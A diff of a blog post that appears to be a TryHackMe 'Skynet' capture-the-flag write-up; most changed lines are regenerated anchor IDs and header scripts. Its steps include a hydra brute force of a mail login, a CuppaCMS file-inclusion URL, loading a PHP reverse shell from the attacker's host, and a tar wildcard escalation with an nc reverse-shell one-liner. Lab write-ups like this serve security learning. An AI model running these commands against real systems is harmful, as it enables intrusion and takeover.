@@ -6,7 +6,7 @@
 <title>THM: Skynet</title>
 <meta name="author" content="Lamprinos Chatziioannou" />
 <meta name="generator" content="Org Mode" />
-<link rel="preconnect" href="https://fonts.googleapis.com"> <link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap" rel="stylesheet"> <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap" rel="stylesheet"> <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono&display=swap" rel="stylesheet"> <script src="https://cdn.jsdelivr.net/gh/oyvindstegard/ox-tagfilter-js/ox-tagfilter.js"></script> <link rel="stylesheet" href="/src/rougier.min.css" /> <script src="/src/copy-pre.min.js"></script> <script src="/src/theme-switcher.min.js" defer></script> <link rel="icon" type="image/x-icon" href="/src/favicon.ico"> <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Google tag (gtag.js) --> <script async src="https://www.googletagmanager.com/gtag/js?id=G-55X4GXWBKS"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-55X4GXWBKS'); </script><script src="https://kit.fontawesome.com/78d5a086dd.js" crossorigin="anonymous"></script>
+<link rel="preconnect" href="https://fonts.googleapis.com"> <link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap" rel="stylesheet"> <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap" rel="stylesheet"> <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono&display=swap" rel="stylesheet"><script src="/src/copy-pre.min.js"></script><script src="/src/theme-switcher.min.js" defer></script><link rel="stylesheet" href="/src/rougier.min.css" /><link rel="icon" type="image/x-icon" href="/src/favicon.ico"><script src="https://kit.fontawesome.com/78d5a086dd.js" crossorigin="anonymous"></script><meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
 <body>
 <div id="preamble" class="status">
@@ -21,43 +21,43 @@
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#org96e9288">Reconnaissance</a>
+<li><a href="#org6164594">Reconnaissance</a>
 <ul>
-<li><a href="#orga55e5a2">Port Scanning</a></li>
-<li><a href="#orgbc101de">Understanding target ports</a></li>
-<li><a href="#orgfe73dc7">Website</a>
+<li><a href="#orgd5d8657">Port Scanning</a></li>
+<li><a href="#org80384cf">Understanding target ports</a></li>
+<li><a href="#orgf264644">Website</a>
 <ul>
-<li><a href="#org1aee93a">Directory Enumeration with gobuster</a></li>
+<li><a href="#org3b7d44b">Directory Enumeration with gobuster</a></li>
 </ul>
 </li>
-<li><a href="#orgf18d83c">Samba enumeration</a></li>
-<li><a href="#org71f1348">Testing the wordlist</a></li>
-<li><a href="#org5393b2f">Checking the mail</a>
+<li><a href="#orgce63946">Samba enumeration</a></li>
+<li><a href="#orgb50300a">Testing the wordlist</a></li>
+<li><a href="#org78a26ae">Checking the mail</a>
 <ul>
-<li><a href="#orgeb4a967">Password rEsEt</a></li>
-<li><a href="#org9c3ab1f">Yeah don&rsquo;t know about that</a></li>
+<li><a href="#org3c86793">Password rEsEt</a></li>
+<li><a href="#orgdf9e427">Yeah don&rsquo;t know about that</a></li>
 </ul>
 </li>
-<li><a href="#org76f8745">Going back to the samba shares</a></li>
-<li><a href="#orgf9ca611">Checking the CMS</a></li>
+<li><a href="#org4c792e6">Going back to the samba shares</a></li>
+<li><a href="#org4162f27">Checking the CMS</a></li>
 </ul>
 </li>
-<li><a href="#orgd4fdc5c">Exploitation</a>
+<li><a href="#orgd19a9ad">Exploitation</a>
 <ul>
-<li><a href="#org9d2c227">CuppaCMS</a>
+<li><a href="#orgef4a15e">CuppaCMS</a>
 <ul>
-<li><a href="#orgbf63e42">Generating a php reverse shell and hosting it</a></li>
+<li><a href="#org5c2d193">Generating a php reverse shell and hosting it</a></li>
 </ul>
 </li>
 </ul>
 </li>
-<li><a href="#org302d310">Privilege Escalation - Lateral Movement</a>
+<li><a href="#org7b7dd4c">Privilege Escalation - Lateral Movement</a>
 <ul>
-<li><a href="#org1bc7b82">www-data</a></li>
+<li><a href="#org0d983ef">www-data</a></li>
 </ul>
 </li>
-<li><a href="#org1ef30be">Getting Root: Tar wildcards</a></li>
-<li><a href="#org594f4df">Conclusion</a></li>
+<li><a href="#orga87fa11">Getting Root: Tar wildcards</a></li>
+<li><a href="#org43b4749">Conclusion</a></li>
 </ul>
 </div>
 </div>
@@ -66,22 +66,22 @@ Yesterday I lost the opportunity to use &ldquo;I&rsquo;ll be back&rdquo; on my p
 title. Unfortunate but I had not seen <code>Skynet</code> in the list of my TODO
 rooms.
 </p>
-<div id="outline-container-org96e9288" class="outline-2">
-<h2 id="org96e9288"><a href="#org96e9288">Reconnaissance</a></h2>
-<div class="outline-text-2" id="text-org96e9288">
+<div id="outline-container-org6164594" class="outline-2">
+<h2 id="org6164594"><a href="#org6164594">Reconnaissance</a></h2>
+<div class="outline-text-2" id="text-org6164594">
 <p>
 Start by updating <code>/etc/hosts</code> and <code>.bashrc</code>, to save yourself some time.
 </p>
 
 <div class="org-src-container">
-<pre class="src src-bash" id="orgec42d85"><span class="org-builtin">echo</span> <span class="org-string">"10.10.201.239  skynet.thm"</span> &gt;&gt; /etc/hosts
+<pre class="src src-bash" id="org63bf6be"><span class="org-builtin">echo</span> <span class="org-string">"10.10.201.239  skynet.thm"</span> &gt;&gt; /etc/hosts
 <span class="org-builtin">echo</span> <span class="org-string">"IP=skynet.thm"</span> &gt;&gt; ~/.bashrc
 </pre>
 </div>
 </div>
-<div id="outline-container-orga55e5a2" class="outline-3">
-<h3 id="orga55e5a2"><a href="#orga55e5a2">Port Scanning</a></h3>
-<div class="outline-text-3" id="text-orga55e5a2">
+<div id="outline-container-orgd5d8657" class="outline-3">
+<h3 id="orgd5d8657"><a href="#orgd5d8657">Port Scanning</a></h3>
+<div class="outline-text-3" id="text-orgd5d8657">
 <p>
 The usual CTF-oriented nmap quick scan revealed quite a lot of open
 ports in the target machine:
@@ -103,47 +103,47 @@ I started the full scan, just to be thorough enough, but we had enough
 data to get going
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="org8c090c9">nmap -sV -sC -oN nmap.initial $<span class="org-variable-name">IP</span>
+<pre class="src src-bash" id="orgdb82073">nmap -sV -sC -oN nmap.initial $<span class="org-variable-name">IP</span>
 nmap -p- -oN nmap.full -T4 $<span class="org-variable-name">IP</span>
 </pre>
 </div>
 </div>
 </div>
-<div id="outline-container-orgbc101de" class="outline-3">
-<h3 id="orgbc101de"><a href="#orgbc101de">Understanding target ports</a></h3>
+<div id="outline-container-org80384cf" class="outline-3">
+<h3 id="org80384cf"><a href="#org80384cf">Understanding target ports</a></h3>
 </div>
-<div id="outline-container-orgfe73dc7" class="outline-3">
-<h3 id="orgfe73dc7"><a href="#orgfe73dc7">Website</a></h3>
-<div class="outline-text-3" id="text-orgfe73dc7">
+<div id="outline-container-orgf264644" class="outline-3">
+<h3 id="orgf264644"><a href="#orgf264644">Website</a></h3>
+<div class="outline-text-3" id="text-orgf264644">
 <p>
 The webserver strangely looks like a search engine, and it does not
 produce any results to the random strings I tried.  
 </p>
 
 
-<div id="org7accdac" class="figure">
+<div id="org44868db" class="figure">
 <p><img src="images/Reconnaissance/20231215_114140_screenshot.png" alt="20231215_114140_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 1: </span>Homepage</p>
 </div>
 </div>
-<div id="outline-container-org1aee93a" class="outline-4">
-<h4 id="org1aee93a"><a href="#org1aee93a">Directory Enumeration with gobuster</a></h4>
-<div class="outline-text-4" id="text-org1aee93a">
+<div id="outline-container-org3b7d44b" class="outline-4">
+<h4 id="org3b7d44b"><a href="#org3b7d44b">Directory Enumeration with gobuster</a></h4>
+<div class="outline-text-4" id="text-org3b7d44b">
 <p>
 Seeing that I was unable to get any promising information manually, I
 did not lose any more time, before launching gobuster:
 </p>
 
 <div class="org-src-container">
-<pre class="src src-bash" id="org6512618">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://$<span class="org-variable-name">IP</span> -o gobuster.big
+<pre class="src src-bash" id="org836409e">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://$<span class="org-variable-name">IP</span> -o gobuster.big
 </pre>
 </div>
 
 <p>
 That, in turn, gave us some directories to check:
 </p>
-<pre class="example" id="orge13a7a4">
+<pre class="example" id="org9ef02a1">
 /.htaccess (Status: 403)
 /.htpasswd (Status: 403)
 /admin (Status: 301)
@@ -160,7 +160,7 @@ While most of these show up as forbidden, <b>squirrelmail</b> is promising:
 </p>
 
 
-<div id="orgc7b9a64" class="figure">
+<div id="org31a073b" class="figure">
 <p><img src="images/Reconnaissance/20231215_114714_screenshot.png" alt="20231215_114714_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 2: </span>SquirrelMail Login page</p>
@@ -174,9 +174,9 @@ Sadly <b>searchsploit</b> did not reveal any usable exploits for that version
 </div>
 </div>
 </div>
-<div id="outline-container-orgf18d83c" class="outline-3">
-<h3 id="orgf18d83c"><a href="#orgf18d83c">Samba enumeration</a></h3>
-<div class="outline-text-3" id="text-orgf18d83c">
+<div id="outline-container-orgce63946" class="outline-3">
+<h3 id="orgce63946"><a href="#orgce63946">Samba enumeration</a></h3>
+<div class="outline-text-3" id="text-orgce63946">
 <p>
 Just from what we have already seen, we do not have any credentials or
 information about the users of this machine. Putting web analysis and
@@ -184,7 +184,7 @@ enumeration on hold for Samba might be the right move to make:
 </p>
 
 
-<div id="orga093c40" class="figure">
+<div id="orgf42f066" class="figure">
 <p><img src="images/Reconnaissance/20231216_125505_screenshot.png" alt="20231216_125505_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 3: </span>Nmap samba info</p>
@@ -199,12 +199,12 @@ I&rsquo;m thinking of using <code>smbclient</code> and if that does not get us a
 Smbclient does a pretty decent job:
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="org634fddf">smbclient -L $<span class="org-variable-name">IP</span> -U guest
+<pre class="src src-bash" id="orgc200b2d">smbclient -L $<span class="org-variable-name">IP</span> -U guest
 </pre>
 </div>
 
 
-<div id="org573bc07" class="figure">
+<div id="org1be9109" class="figure">
 <p><img src="images/Reconnaissance/20231216_125934_screenshot.png" alt="20231216_125934_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 4: </span>Shares on target samba</p>
@@ -222,10 +222,10 @@ gain initial foothold or privilege escalation later on)</li>
 </ul>
 </div>
 <ul class="org-ul">
-<li><a id="orgd7b147c"></a><a href="#orgd7b147c">Anonymous</a><br>
-<div class="outline-text-5" id="text-orgd7b147c">
+<li><a id="orge510821"></a><a href="#orge510821">Anonymous</a><br>
+<div class="outline-text-5" id="text-orge510821">
 <div class="org-src-container">
-<pre class="src src-bash" id="orgfd7ba1c">smbclient //$<span class="org-variable-name">IP</span>/anonymous -U guest
+<pre class="src src-bash" id="org5f36bfb">smbclient //$<span class="org-variable-name">IP</span>/anonymous -U guest
 </pre>
 </div>
 
@@ -245,10 +245,10 @@ against the login prompt (or the samba share / ssh server maybe) with
 </ul>
 </div>
 </li>
-<li><a id="org2d265d9"></a><a href="#org2d265d9">Milesdyson</a><br>
-<div class="outline-text-5" id="text-org2d265d9">
+<li><a id="orga2cb3e9"></a><a href="#orga2cb3e9">Milesdyson</a><br>
+<div class="outline-text-5" id="text-orga2cb3e9">
 <div class="org-src-container">
-<pre class="src src-bash" id="org2a02dbc">smbclient //$<span class="org-variable-name">IP</span>/milesdyson -U guest
+<pre class="src src-bash" id="orgd541bca">smbclient //$<span class="org-variable-name">IP</span>/milesdyson -U guest
 </pre>
 </div>
 
@@ -259,9 +259,9 @@ Access denied - can&rsquo;t login here as <code>milesdyson</code>.
 </li>
 </ul>
 </div>
-<div id="outline-container-org71f1348" class="outline-3">
-<h3 id="org71f1348"><a href="#org71f1348">Testing the wordlist</a></h3>
-<div class="outline-text-3" id="text-org71f1348">
+<div id="outline-container-orgb50300a" class="outline-3">
+<h3 id="orgb50300a"><a href="#orgb50300a">Testing the wordlist</a></h3>
+<div class="outline-text-3" id="text-orgb50300a">
 <ul class="org-ul">
 <li>The given wordlist proved useless for ssh login</li>
 <li>Testing the wordlist on the mail entrypoint was a good choice : we
@@ -269,45 +269,45 @@ got miles password</li>
 </ul>
 
 <div class="org-src-container">
-<pre class="src src-bash" id="org6559f7a">hydra -l milesdyson -P log1.txt $<span class="org-variable-name">IP</span> http-post-form <span class="org-string">"/squirrelmail/src/redirect.php: login_username=^USER^&amp;secretkey=^PASS^&amp;js_autodetect_results=1&amp;just_logged_in=1:incorrect"</span>
+<pre class="src src-bash" id="orgba0e73a">hydra -l milesdyson -P log1.txt $<span class="org-variable-name">IP</span> http-post-form <span class="org-string">"/squirrelmail/src/redirect.php: login_username=^USER^&amp;secretkey=^PASS^&amp;js_autodetect_results=1&amp;just_logged_in=1:incorrect"</span>
 </pre>
 </div>
 </div>
 </div>
-<div id="outline-container-org5393b2f" class="outline-3">
-<h3 id="org5393b2f"><a href="#org5393b2f">Checking the mail</a></h3>
-<div class="outline-text-3" id="text-org5393b2f">
+<div id="outline-container-org78a26ae" class="outline-3">
+<h3 id="org78a26ae"><a href="#org78a26ae">Checking the mail</a></h3>
+<div class="outline-text-3" id="text-org78a26ae">
 <p>
 Using the newly found password, we can try to see if there is any
 useful information in the user&rsquo;s email account:
 </p>
 </div>
-<div id="outline-container-orgeb4a967" class="outline-4">
-<h4 id="orgeb4a967"><a href="#orgeb4a967">Password rEsEt</a></h4>
-<div class="outline-text-4" id="text-orgeb4a967">
+<div id="outline-container-org3c86793" class="outline-4">
+<h4 id="org3c86793"><a href="#org3c86793">Password rEsEt</a></h4>
+<div class="outline-text-4" id="text-org3c86793">
 
-<div id="org4d27a04" class="figure">
+<div id="orgf67ee88" class="figure">
 <p><img src="images/Reconnaissance/20231216_131629_screenshot.png" alt="20231216_131629_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 5: </span>Lo and Behold</p>
 </div>
 </div>
 </div>
-<div id="outline-container-org9c3ab1f" class="outline-4">
-<h4 id="org9c3ab1f"><a href="#org9c3ab1f">Yeah don&rsquo;t know about that</a></h4>
-<div class="outline-text-4" id="text-org9c3ab1f">
+<div id="outline-container-orgdf9e427" class="outline-4">
+<h4 id="orgdf9e427"><a href="#orgdf9e427">Yeah don&rsquo;t know about that</a></h4>
+<div class="outline-text-4" id="text-orgdf9e427">
 <p>
 In another mail, we get this binary sequence, which given its
 structure suggests the usage of a binary to ASCII converter: The final
 text makes <b>absolutely</b> no sense:
 </p>
 
-<pre class="example" id="org4d71adb">
+<pre class="example" id="org1558ac3">
 balls have zero to me to me to me to me to me to me to me to me to
 </pre>
 
 
-<div id="org4a05e15" class="figure">
+<div id="org53758ca" class="figure">
 <p><img src="images/Reconnaissance/20231216_131754_screenshot.png" alt="20231216_131754_screenshot.png">
 </p>
 </div>
@@ -321,11 +321,11 @@ here</a>
 </div>
 </div>
 </div>
-<div id="outline-container-org76f8745" class="outline-3">
-<h3 id="org76f8745"><a href="#org76f8745">Going back to the samba shares</a></h3>
-<div class="outline-text-3" id="text-org76f8745">
+<div id="outline-container-org4c792e6" class="outline-3">
+<h3 id="org4c792e6"><a href="#org4c792e6">Going back to the samba shares</a></h3>
+<div class="outline-text-3" id="text-org4c792e6">
 <div class="org-src-container">
-<pre class="src src-bash" id="org0cbcbff">smbclient //$<span class="org-variable-name">IP</span>/milesdyson -U milesdyson
+<pre class="src src-bash" id="orgc11208f">smbclient //$<span class="org-variable-name">IP</span>/milesdyson -U milesdyson
 </pre>
 </div>
 
@@ -337,16 +337,16 @@ gO nOw?
 </p>
 
 
-<div id="org2cde032" class="figure">
+<div id="org63d7bd2" class="figure">
 <p><img src="images/Reconnaissance/20231216_132530_screenshot.png" alt="20231216_132530_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 6: </span>Important.txt</p>
 </div>
 </div>
 </div>
-<div id="outline-container-orgf9ca611" class="outline-3">
-<h3 id="orgf9ca611"><a href="#orgf9ca611">Checking the CMS</a></h3>
-<div class="outline-text-3" id="text-orgf9ca611">
+<div id="outline-container-org4162f27" class="outline-3">
+<h3 id="org4162f27"><a href="#org4162f27">Checking the CMS</a></h3>
+<div class="outline-text-3" id="text-org4162f27">
 <p>
 There seems to be a personal webpage at the new link we found out
 about. Again, enumeration is due:
@@ -356,7 +356,7 @@ about. Again, enumeration is due:
 </ul>
 
 <div class="org-src-container">
-<pre class="src src-bash" id="org34cadfe">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://$<span class="org-variable-name">IP</span>/45kra24zxs28v3yd -o gobuster.big
+<pre class="src src-bash" id="orga4f29bf">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://$<span class="org-variable-name">IP</span>/45kra24zxs28v3yd -o gobuster.big
 </pre>
 </div>
 
@@ -365,7 +365,7 @@ Visiting <code>/administrator</code> we get to a login page of <b>CuppaCMS</b>:
 </p>
 
 
-<div id="org2d2482c" class="figure">
+<div id="org91dbaf2" class="figure">
 <p><img src="images/Reconnaissance/20231216_132854_screenshot.png" alt="20231216_132854_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 7: </span>Login page of Cuppa</p>
@@ -379,13 +379,13 @@ Apparently there is a readily available exploit in exploit-db: 25971.
 </div>
 </div>
 </div>
-<div id="outline-container-orgd4fdc5c" class="outline-2">
-<h2 id="orgd4fdc5c"><a href="#orgd4fdc5c">Exploitation</a></h2>
-<div class="outline-text-2" id="text-orgd4fdc5c">
+<div id="outline-container-orgd19a9ad" class="outline-2">
+<h2 id="orgd19a9ad"><a href="#orgd19a9ad">Exploitation</a></h2>
+<div class="outline-text-2" id="text-orgd19a9ad">
 </div>
-<div id="outline-container-org9d2c227" class="outline-3">
-<h3 id="org9d2c227"><a href="#org9d2c227">CuppaCMS</a></h3>
-<div class="outline-text-3" id="text-org9d2c227">
+<div id="outline-container-orgef4a15e" class="outline-3">
+<h3 id="orgef4a15e"><a href="#orgef4a15e">CuppaCMS</a></h3>
+<div class="outline-text-3" id="text-orgef4a15e">
 <p>
 Using the following payload, as described in the exploit we found, we
 see that there is:
@@ -395,19 +395,19 @@ see that there is:
 <li>RFI potential (PHP injection) (a reverse shell might be nice as well)</li>
 </ol>
 
-<pre class="example" id="org5f37c91">
+<pre class="example" id="org80ed1f4">
 http://skynet.thm/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
 </pre>
 </div>
-<div id="outline-container-orgbf63e42" class="outline-4">
-<h4 id="orgbf63e42"><a href="#orgbf63e42">Generating a php reverse shell and hosting it</a></h4>
-<div class="outline-text-4" id="text-orgbf63e42">
+<div id="outline-container-org5c2d193" class="outline-4">
+<h4 id="org5c2d193"><a href="#org5c2d193">Generating a php reverse shell and hosting it</a></h4>
+<div class="outline-text-4" id="text-org5c2d193">
 <p>
 I always like using <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">this</a> as my go-to php shell so there was not much
 to do:
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="org76990d6">wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+<pre class="src src-bash" id="org018838e">wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
 vim php-reverse-shell.php
 python3 -m http.server
 nc -lvnp 6969 <span class="org-comment-delimiter"># </span><span class="org-comment">do not forget the listener</span>
@@ -418,7 +418,7 @@ nc -lvnp 6969 <span class="org-comment-delimiter"># </span><span class="org-comm
 Then, manipulating the <code>urlConfig</code> parameter once again we forge a
 request:
 </p>
-<pre class="example" id="org7874c10">
+<pre class="example" id="org83cb1ed">
 http://skynet.thm/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.95.44:8000/php-reverse-shell.php
 </pre>
 
@@ -429,20 +429,20 @@ This successfully gives us an entrypoint!
 </div>
 </div>
 </div>
-<div id="outline-container-org302d310" class="outline-2">
-<h2 id="org302d310"><a href="#org302d310">Privilege Escalation - Lateral Movement</a></h2>
-<div class="outline-text-2" id="text-org302d310">
+<div id="outline-container-org7b7dd4c" class="outline-2">
+<h2 id="org7b7dd4c"><a href="#org7b7dd4c">Privilege Escalation - Lateral Movement</a></h2>
+<div class="outline-text-2" id="text-org7b7dd4c">
 <p>
 Before doing anything else, make the shell more usable:
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="orgf7e7f38">python3 -c <span class="org-string">'import pty; pty.spawn("/bin/bash")'</span>
+<pre class="src src-bash" id="org11df477">python3 -c <span class="org-string">'import pty; pty.spawn("/bin/bash")'</span>
 </pre>
 </div>
 </div>
-<div id="outline-container-org1bc7b82" class="outline-3">
-<h3 id="org1bc7b82"><a href="#org1bc7b82">www-data</a></h3>
-<div class="outline-text-3" id="text-org1bc7b82">
+<div id="outline-container-org0d983ef" class="outline-3">
+<h3 id="org0d983ef"><a href="#org0d983ef">www-data</a></h3>
+<div class="outline-text-3" id="text-org0d983ef">
 <p>
 We can move to miles home directory and get the user flag, but there
 are some more interesting files there as well:
@@ -457,9 +457,9 @@ options</li>
 </div>
 </div>
 </div>
-<div id="outline-container-org1ef30be" class="outline-2">
-<h2 id="org1ef30be"><a href="#org1ef30be">Getting Root: Tar wildcards</a></h2>
-<div class="outline-text-2" id="text-org1ef30be">
+<div id="outline-container-orga87fa11" class="outline-2">
+<h2 id="orga87fa11"><a href="#orga87fa11">Getting Root: Tar wildcards</a></h2>
+<div class="outline-text-2" id="text-orga87fa11">
 <p>
 I have seen this exploit before so I know that by creating the right
 set of files, this line can result to either the creation of a SUID
@@ -467,7 +467,7 @@ shell file for us, or to another reverse shell. For the shake of
 simplicity, I will go the second route.<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>
 </p>
 
-<pre class="example" id="orgf21a51d">
+<pre class="example" id="org6fc0d67">
 tar cf /home/milesdyson/backups/backup.tgz *
 </pre>
 
@@ -478,16 +478,16 @@ with the command, I changed my approach to the following:
 </p>
 
 <div class="org-src-container">
-<pre class="src src-bash" id="org4c81f68"><span class="org-builtin">echo</span> <span class="org-string">''</span>&gt;  <span class="org-string">'--checkpoint=1'</span>
+<pre class="src src-bash" id="org942217f"><span class="org-builtin">echo</span> <span class="org-string">''</span>&gt;  <span class="org-string">'--checkpoint=1'</span>
 <span class="org-builtin">echo</span> <span class="org-string">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc 10.10.95.44 6970 &gt;/tmp/f'</span> &gt; shell.sh
 <span class="org-builtin">echo</span> <span class="org-string">""</span> &gt; <span class="org-string">"--checkpoint-action=exec=bash shell.sh"</span>
 </pre>
 </div>
 </div>
 </div>
-<div id="outline-container-org594f4df" class="outline-2">
-<h2 id="org594f4df"><a href="#org594f4df">Conclusion</a></h2>
-<div class="outline-text-2" id="text-org594f4df">
+<div id="outline-container-org43b4749" class="outline-2">
+<h2 id="org43b4749"><a href="#org43b4749">Conclusion</a></h2>
+<div class="outline-text-2" id="text-org43b4749">
 <div class="tenor-gif-embed" data-postid="20118743" data-share-method="host" data-aspect-ratio="1.56863" data-width="100%"><a href="https://tenor.com/view/exterminador-do-futuro-gif-20118743">Exterminador Futuro GIF</a>from <a href="https://tenor.com/search/exterminador-gifs">Exterminador GIFs</a></div> <script type="text/javascript" async src="https://tenor.com/embed.js"></script>
 </div>
 </div>
@@ -503,7 +503,7 @@ In fact: source: <a href="https://www.sevenlayers.com/index.php/353-exploiting-t
 </div>
 </div></div>
 <div id="postamble" class="status">
-<script src="https://giscus.app/client.js" data-repo="chatziiola/chatziiola.github.io" data-repo-id=x\"R_kgDOGq8p0g" data-category="Announcements" data-category-id="DIC_kwDOGq8p0s4COSFW" data-mapping="pathname" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="light" data-lang="en" data-loading="lazy" crossorigin="anonymous" async> </script> <p class=\"date footer\"> Originally created on 2023-12-15 Fri 11:32</p><p class="footer"> Made with Emacs and Org.<br>CSS theme based on the one developed by <a href="https://github.com/rougier">@rougier</a>.<br> <a href="https://github.com/chatziiola"> <i class="fa-brands fa-github"></i> </a> <a href="https://www.linkedin.com/in/chatziiola"> <i class="fa-brands fa-linkedin"></i> </a> <a href="/posts/rss.xml"> <i class="fa-solid fa-rss"></i> </a> </p>
+<script src="https://giscus.app/client.js" data-repo="chatziiola/chatziiola.github.io" data-repo-id=x\"R_kgDOGq8p0g" data-category="Announcements" data-category-id="DIC_kwDOGq8p0s4COSFW" data-mapping="pathname" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="light" data-lang="en" data-loading="lazy" crossorigin="anonymous" async></script><p class="date footer"> Originally created on 2023-12-15 Fri 11:32</p><p class="footer footer-text">Made with Emacs and Org.<br>CSS theme based on the one developed by <a href="https://github.com/rougier">@rougier</a>.<br>© 2025 Lamprinos Chatziioannou. <a href="https://github.com/chatziiola/chatziiola.github.io/blob/main/LICENSE">Content may be shared with attribution</a>.</p><p class="footer footer-social" ><a href="https://github.com/chatziiola"><i class="fa-brands fa-github"></i></a><a href="https://www.linkedin.com/in/chatziiola"> <i class="fa-brands fa-linkedin"></i></a><a href="/posts/rss.xml"> <i class="fa-solid fa-rss"></i> </a></p>
 </div>
 </body>
 </html>
